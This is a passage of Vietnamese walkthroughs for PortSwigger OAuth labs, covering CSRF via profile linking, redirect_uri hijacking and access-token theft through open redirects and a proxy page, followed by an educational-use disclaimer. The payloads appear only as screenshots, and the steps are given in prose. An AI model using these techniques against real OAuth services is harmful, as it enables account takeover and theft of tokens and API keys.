<p><img src="oauth/implicit-flow/oauth-profile-linking/code.jpg" alt="Code linking"></p>
<p>Okay, đến đây ta thực hiện login lại từ đầu và link với social account 1 lần nữa, nhưng đến bước <em>Continue</em> sau khi link với social account thì ta sẽ drop nó để hủy request (có nghĩa là đợi server gửi code cho mình xong mình sẽ qua cầu rút ván =)))).</p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/stolen-code.jpg" alt="Stolen code"></p>
<p>Đây là code mà mình đã trộm được. Bây giờ, mình sẽ vào exploit server để khai thác. Bởi vì server sẽ đọc tất cả những gì mà mình gửi do vậy, mình sẽ gửi đi 1 iframe để đánh lừa hệ thống với code mình trộm được ban nãy. Mình sẽ copy nguyên cái request chứa mã xác thực nãy chưa dùng và gắn nó vào src:</p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/iframe-body-request.jpg" alt="Stolen code"></p>
<p>Sau đó, mình send nó và reload lại page và click vào Admin Panel thì mình sẽ thấy được 2 nút delete quyền lực:</p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/admin.jpg" alt="Stolen code"></p>
<p>Đến đây thì bai bai chú Carlos và thế là solved!</p>
<p><img src="oauth/implicit-flow/oauth-profile-linking/solved.jpg" alt="Stolen code"></p>
<h2 id="kết-luận"><a class="header" href="#kết-luận">Kết luận</a></h2>
<p>Tóm lại, OAuth sẽ có nhiều option để thiết lập, do vậy, khi thiếu state khi trao đổi thông tin từ server và client thì sẽ là một mối nguy hiểm liên quan đến lỗ hổng CSRF.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="oauth-redirect-uri-vulnerabilities"><a class="header" href="#oauth-redirect-uri-vulnerabilities">OAuth Redirect URI Vulnerabilities</a></h1>
<blockquote>
<p><strong>Khai thác lỗ hổng trong xác thực redirect_uri</strong></p>
<p>Các labs trong phần này tập trung vào việc khai thác lỗ hổng liên quan đến redirect_uri trong OAuth 2.0.</p>
</blockquote>
<h2 id="giới-thiệu-11"><a class="header" href="#giới-thiệu-11">Giới thiệu</a></h2>
<p>Redirect URI là một thành phần quan trọng trong OAuth 2.0 flow. Nếu server không xác thực đúng cách redirect_uri, attacker có thể:</p>
<ul>
<li>Hijack authorization code</li>
<li>Đánh cắp access tokens</li>
<li>Chiếm quyền tài khoản người dùng</li>
</ul>
<h2 id="labs-7"><a class="header" href="#labs-7">Labs</a></h2>
<h3 id="oauth-account-hijacking-via-redirect_uri"><a class="header" href="#oauth-account-hijacking-via-redirect_uri"><a href="#lab-oauth-account-hijacking-via-redirect_uri">OAuth account hijacking via redirect_uri</a></a></h3>
<p>Khai thác lỗ hổng xác thực redirect_uri để hijack authorization code và chiếm tài khoản admin.</p>
<h3 id="stealing-oauth-access-tokens-via-an-open-redirect"><a class="header" href="#stealing-oauth-access-tokens-via-an-open-redirect"><a href="#lab-stealing-oauth-access-tokens-via-an-open-redirect">Stealing OAuth access tokens via an open redirect</a></a></h3>
<p>Sử dụng path traversal kết hợp với open redirect để leak access tokens của nạn nhân.</p>
<h3 id="stealing-oauth-access-tokens-via-a-proxy-page"><a class="header" href="#stealing-oauth-access-tokens-via-a-proxy-page"><a href="#lab-stealing-oauth-access-tokens-via-a-proxy-page">Stealing OAuth access tokens via a proxy page</a></a></h3>
<p>Lợi dụng trang proxy để đánh cắp OAuth access tokens thông qua iframe injection.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-oauth-account-hijacking-via-redirect_uri"><a class="header" href="#lab-oauth-account-hijacking-via-redirect_uri">Lab: OAuth account hijacking via redirect_uri</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri">https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri</a></p>
<p><img src="oauth/redirect-uri/oauth-hijacking/lab.jpg" alt="Lab OAuth-hijacking"></p>
<h2 id="phân-tích-21"><a class="header" href="#phân-tích-21">Phân tích</a></h2>
<p>Đầu tiên, mình sẽ “go around” website với quy trình login. Mở Burp check History Proxy, ta có thể thấy được request yêu cầu xác thực <strong>/auth?client_id=…</strong>:</p>
<p><img src="oauth/redirect-uri/oauth-hijacking/auth-client.jpg" alt="Auth Client request"></p>
<p>Sau đó, ta send nó sang Burp Repeater để tiện theo dõi quá trình “login” của nó. Ở đây, với tham số <strong>redirect_uri</strong>, ta có thể thử điều chỉnh nó đến exploit server để xem có gì xảy ra:</p>
<p><img src="oauth/redirect-uri/oauth-hijacking/test.jpg" alt="Test"></p>
<p>Sau khi send request, ta tiếp tục Follow Redirect thì nhận được một redirect url với một dòng code như bên trên. Như vậy, có thể thấy với tham số redirect-uri mà không kiểm tra thì ta có thể dễ dàng redirect đến bất cứ đâu ta muốn như trong trường hợp này thì đã lừa được server gọi callback send code về cho ta.</p>
<h2 id="khai-thác-30"><a class="header" href="#khai-thác-30">Khai thác</a></h2>
<p>Tương tự, ta sẽ sử dụng Exploit Server để tiến hành exploit challenge. Mình sẽ send một request đến <strong>/exploit</strong> với body là một iframe:</p>
<p><img src="oauth/redirect-uri/oauth-hijacking/exploit.jpg" alt="Exploit with iframe"></p>
<p>Sau khi Store và Deliver Code đến nạn nhân, kiểm tra Access log thì ta có được một request với leak-code:</p>
<p><img src="oauth/redirect-uri/oauth-hijacking/leaked-code.jpg" alt="Leaked Code"></p>
<p>Sử dụng browser để truy cập đến URL đó, ta sẽ vào được Admin Panel:</p>
<p><img src="oauth/redirect-uri/oauth-hijacking/openleakcode.jpg" alt="Open Leaked Code URL"></p>
<p><img src="oauth/redirect-uri/oauth-hijacking/gotoadmin.jpg" alt="Admin Panel"></p>
<p>Và thế là ta đã vào được Admin Panel, tiến hành xóa chú Carlos thì đã giải được challenge:</p>
<p><img src="oauth/redirect-uri/oauth-hijacking/solved.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-stealing-oauth-access-tokens-via-an-open-redirect"><a class="header" href="#lab-stealing-oauth-access-tokens-via-an-open-redirect">Lab: Stealing OAuth access tokens via an open redirect</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/oauth/lab-OAuth-stealing-redirect-oauth-access-tokens-via-an-open-redirect">https://portswigger.net/web-security/oauth/lab-OAuth-stealing-redirect-oauth-access-tokens-via-an-open-redirect</a></p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/lab.jpg" alt="OAuth-stealing-redirect-access-token"></p>
<h2 id="giới-thiệu-12"><a class="header" href="#giới-thiệu-12">Giới thiệu</a></h2>
<p>Thử thay đổi URI như các phần bên trên thì kết quả cho thấy, server không chiều theo ý ta nữa rồi. Ở lab này, tác giả có đề cập đến 1 phương pháp đó chính là Path Traversal và ta sẽ sử dụng chúng.</p>
<h2 id="khai-thác-31"><a class="header" href="#khai-thác-31">Khai thác</a></h2>
<p>Ở server exploit, ta sẽ thử send đến server đoạn payload như dưới đây để buộc server gửi về cho ta access token:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/payload.jpg" alt="payload"></p>
<p>Sau khi Store, ta sử dụng View Exploit xem payload đã gửi chưa:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/view-exploit.jpg" alt="view-exploit"></p>
<p>Như ta thấy, một access token đã được đính kèm trên URL như vậy có nghĩa là token này đã bị leaked khi ta sử dụng payload.</p>
<p>Quay lại Proxy History, ta thấy với request <strong>/me</strong>, server sẽ trả về cho ta một cái gọi là apikey. Để trả về đúng API key, server sẽ xác thực với <strong>Authorization</strong> cùng token:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/test.jpg" alt="Test request API Key"></p>
<p>Ta sẽ Delivery code exploit với payload ở trên để leak 1 token mới. Kiểm tra log sẽ thấy token như sau:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/log.jpg" alt="Log"></p>
<p>Đến lúc này ta thay đổi token và send nó thì sẽ nhận được API key cần tìm của administrator:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/exploit.jpg" alt="Exploit"></p>
<p>Và lúc này chỉ cần submit challenge thôi:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-redirect/solved.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-stealing-oauth-access-tokens-via-a-proxy-page"><a class="header" href="#lab-stealing-oauth-access-tokens-via-a-proxy-page">Lab: Stealing OAuth access tokens via a proxy page</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page">https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page</a></p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/lab.jpg" alt="OAuth-stealing-proxy-page"></p>
<h2 id="phân-tích-22"><a class="header" href="#phân-tích-22">Phân tích</a></h2>
<p>Bài này cũng khá giống với bài bên trên, audit website thì ta có thể thấy ở mỗi post đều có chức năng bình luận và bình luận cái gì cũng được:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/comment.jpg" alt="Test comment"></p>
<p>Đến đây, sau khi tham khảo payload, mình đã thử sử dụng payload như sau:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/payload.jpg" alt="Payload"></p>
<p>Store và View Exploit thì thấy ta đã có một iframe comment như lab:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/view-exploit.jpg" alt="View Exploit"></p>
<h2 id="khai-thác-32"><a class="header" href="#khai-thác-32">Khai thác</a></h2>
<p>Đến đây coi như xong, ta Delivery exploit code sau đó check log để get token:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/log.jpg" alt="Get token"></p>
<p>Send token bằng request <strong>/me</strong>:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/exploit.jpg" alt="Exploit"></p>
<p>Như vậy, ta đã có được API của administrator, submit thôi:</p>
<p><img src="oauth/redirect-uri/oauth-stealing-proxy/solved.jpg" alt="API key"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="disclaimer"><a class="header" href="#disclaimer">Disclaimer</a></h1>
<p>This project is intended <strong>for educational purposes only</strong>.</p>
<p>By using any materials, scripts, or walkthroughs provided in this repository, you agree to the following:</p>
<ul>
<li>You will not use any information or tools provided here for malicious or unauthorized purposes.</li>
<li>All challenges and labs referenced are publicly accessible platforms or practice environments (e.g., Root-Me, PortSwigger).</li>
<li>The content is shared for the purpose of learning cybersecurity, penetration testing, and ethical hacking techniques.</li>
<li>The author(s) are <strong>not responsible</strong> for any misuse, damage, or legal consequences resulting from the use of this content.</li>
</ul>
<p>If you’re unsure about whether your actions are ethical or legal, you probably shouldn’t do them.</p>
<blockquote>
<p><strong>Stay ethical. Hack responsibly. Learn continuously.</strong></p>
</blockquote>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>



        <script>
            window.playground_copyable = true;
        </script>

        <script src="ace.js"></script>
        <script src="mode-rust.js"></script>
        <script src="editor.js"></script>
        <script src="theme-dawn.js"></script>
        <script src="theme-tomorrow_night.js"></script>

        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->
        <script src="theme/js/medium-zoom.min.js"></script>
        <script src="theme/js/image-zoom.js"></script>

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>


    </div>
    </body>
</html>
